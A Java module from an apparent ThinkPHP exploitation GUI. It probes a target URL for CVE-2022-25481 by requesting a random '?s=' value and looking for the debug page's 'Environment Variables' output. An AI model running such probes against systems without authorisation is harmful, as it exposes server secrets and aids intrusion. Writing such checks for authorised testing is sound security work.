package exploit;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.ConfigManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class Tp_CVE_2022_25481 implements Exploit{
    ConfigManager configManager=ConfigManager.getInstance();

    private void verify(String url){
         try{
             HttpURLConnection httpURLConnection=(HttpURLConnection) new URL(url+"?s="+(int)(Math.random()*10000)+10000).openConnection();
             int code=httpURLConnection.getResponseCode();
             BufferedReader reader;
             if(code>=400){
                  reader=new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
             }else{
                  reader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
             }

             String line;
             while((line=reader.readLine())!=null){
                 if(line.contains("Environment Variables")||line.contains("Server/Request Data")){
                     configManager.appendToTextArea("[+] "+url+"   存在TP CVE-2022-25481   "+url+"?s=xxx");
                     return;
                 }
             }
         }catch (Exception e){
             e.printStackTrace();
         }

         configManager.appendToTextArea("[-] "+url+"   不存在TP CVE-2022-25481");

    }

    @Override
    public void startScan(String url){

        verify(url);

    }
}
